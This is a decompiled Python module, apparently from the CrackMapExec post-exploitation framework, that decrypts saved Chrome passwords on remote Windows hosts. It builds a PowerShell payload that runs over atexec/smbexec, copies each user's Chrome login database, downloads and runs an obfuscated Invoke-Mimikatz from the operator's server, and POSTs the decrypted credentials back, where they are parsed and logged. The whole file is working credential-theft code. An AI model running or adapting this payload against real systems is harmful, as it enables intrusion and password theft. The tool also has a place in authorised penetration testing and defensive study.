# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/modules/enum_chrome.py
# Compiled at: 2016-12-29 02:32:24
from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, gen_random_string, validate_ntlm, write_log
from datetime import datetime
from StringIO import StringIO
import re

class CMEModule:
    """
        Executes PowerSploit's Invoke-Mimikatz.ps1 script (Mimikatz's DPAPI Module) to decrypt saved Chrome passwords
        Module by @byt3bl33d3r
    """
    name = 'enum_chrome'
    description = "Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords"

    def options(self, context, module_options):
        """
        """
        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):
        """
            Oook.. Think my heads going to explode

            So Mimikatz's DPAPI module requires the path to Chrome's database in double quotes otherwise it can't interpret paths with spaces.
            Problem is Invoke-Mimikatz interpretes double qoutes as seperators for the arguments to pass to the injected mimikatz binary.

            As far as I can figure out there is no way around this, hence we have to first copy Chrome's database to a path without any spaces and then decrypt the entries with Mimikatz
        """
        payload = ('\n        $cmd = "privilege::debug sekurlsa::dpapi"\n        $userdirs = get-childitem "$Env:SystemDrive\\Users"\n        foreach ($dir in $userdirs) {{\n            $LoginDataPath = "$Env:SystemDrive\\Users\\$dir\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"\n\n            if ([System.IO.File]::Exists($LoginDataPath)) {{\n                $rand_name = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {{[char]$_}})\n                $temp_path = "$Env:windir\\Temp\\$rand_name"\n                Copy-Item $LoginDataPath $temp_path\n                $cmd = $cmd + " `"dpapi::chrome /in:$temp_path`""\n            }}\n\n        }}\n        $cmd = $cmd + " exit"\n\n        IEX (New-Object Net.WebClient).DownloadString(\'{server}://{addr}:{port}/Invoke-Mimikatz.ps1\');\n        $creds = Invoke-{func_name} -Command $cmd;\n        $request = [System.Net.WebRequest]::Create(\'{server}://{addr}:{port}/\');\n        $request.Method = \'POST\';\n        $request.ContentType = \'application/x-www-form-urlencoded\';\n        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);\n        $request.ContentLength = $bytes.Length;\n        $requestStream = $request.GetRequestStream();\n        $requestStream.Write( $bytes, 0, $bytes.Length );\n        $requestStream.Close();\n        $request.GetResponse();').format(server=context.server, port=context.server_port, addr=context.localip, func_name=self.obfs_name)
        context.log.debug(('Payload: {}').format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload, methods=['atexec', 'smbexec'])
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as (ps_script):
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)
        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)
        response.stop_tracking_host()
        if len(data):
            buf = StringIO(data).readlines()
            creds = []
            try:
                i = 0
                while i < len(buf):
                    if 'URL' in buf[i]:
                        url = buf[i].split(':', 1)[1].strip()
                        user = buf[(i + 1)].split(':', 1)[1].strip()
                        passw = buf[(i + 3)].split(':', 1)[1].strip()
                        creds.append({'url': url, 'user': user, 'passw': passw})
                    i += 1

                if creds:
                    context.log.success('Found saved Chrome credentials:')
                    for cred in creds:
                        context.log.highlight('URL: ' + cred['url'])
                        context.log.highlight('Username: ' + cred['user'])
                        context.log.highlight('Password: ' + cred['passw'])
                        context.log.highlight('')

            except:
                context.log.error('Error parsing Mimikatz output, please check log file manually for possible credentials')

            log_name = ('EnumChrome-{}-{}.log').format(response.client_address[0], datetime.now().strftime('%Y-%m-%d_%H%M%S'))
            write_log(data, log_name)
            context.log.info(("Saved Mimikatz's output to {}").format(log_name))